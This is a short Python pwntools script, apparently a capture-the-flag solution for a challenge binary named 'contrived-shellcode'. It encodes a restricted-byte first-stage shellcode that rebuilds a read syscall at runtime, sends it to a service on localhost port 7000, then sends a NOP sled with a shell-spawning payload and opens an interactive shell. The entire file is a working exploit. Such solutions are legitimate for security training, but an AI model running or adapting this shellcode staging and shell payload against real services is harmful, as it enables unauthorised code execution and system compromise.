from pwn import *
from pathlib import Path

context.binary = ELF("contrived-shellcode")

stage2 = asm("""
mov eax, 0
mov edi, 0
push rdx
pop rsi
and edx, 0x000f0000
syscall
""")

rcx = 0x10
adds = []
jumps = []
img = []
for i, b in enumerate(stage2):
    q, r = divmod(b, rcx)
    img.append(r)
    if q != 0:
        jump = 1
        for j, b in enumerate(stage2[i + 1:]):
            if b // rcx != 0:
                jump += j
                break
        jumps.append(jump)
        adds.append(q)

init = ""
for i, (add, jump) in enumerate(zip(adds, jumps)):
    init += "add byte ptr [rdx + rax], cl\n" * add
    # omit the last adjustment to rax because we don't use it
    if i < len(adds) - 1:
        init += f"add al, {jump}\n"

def set_al(n):
    q, r = divmod(n, 0x0f)
    return q * "add al, 0x0f\n" + f"add al, {r}\n"

# determined by trial and error to eliminate padding nops
destination = 0x0f * 0x0e - (2 * 5)
payload = asm(set_al(destination) + init)
assert len(payload) <= destination
pad = destination - len(payload)
assert pad % 2 == 0
payload += (pad // 2) * b"\x0c\x00"
payload += bytes(img)
assert b"\n" not in payload

p = remote("localhost", 7000)
p.sendline(payload)
p.sendline(b"\x90" * len(payload) + asm(shellcraft.sh()))
print(f"initial input is {len(payload)} bytes")
p.interactive()
